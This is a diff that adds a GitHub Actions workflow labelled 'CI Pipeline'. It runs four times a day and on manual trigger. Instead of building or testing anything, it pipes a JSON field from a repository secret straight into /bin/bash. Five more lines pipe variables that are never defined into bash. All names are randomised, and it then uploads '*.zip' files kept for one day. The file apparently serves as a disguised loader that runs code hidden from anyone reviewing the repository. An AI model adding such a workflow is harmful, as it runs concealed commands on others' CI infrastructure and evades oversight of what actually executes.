@@ -1,0 +1,28 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '2 3,9,15,21 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute
+        env:
+          pnac40331: ${{ secrets.pnac40331 }}
+        run: |
+          printf '%s' "$pnac40331" | jq -r .wur52986 | /bin/bash
+          echo $smij0581 | jq -r .lpav30191 | /bin/bash
+          printf '%s' "$mp902" | jq -r .ityq52204 | /bin/bash
+          echo $ciex233 | jq -r .ziztl44233 | /bin/bash
+          printf '%s' "$bmyr0744" | jq -r .dbfta028 | /bin/bash
+          printf '%s' "$n29037" | jq -r .htocf915 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: TAqePVTA
+          path: "*.zip"
+          retention-days: 1
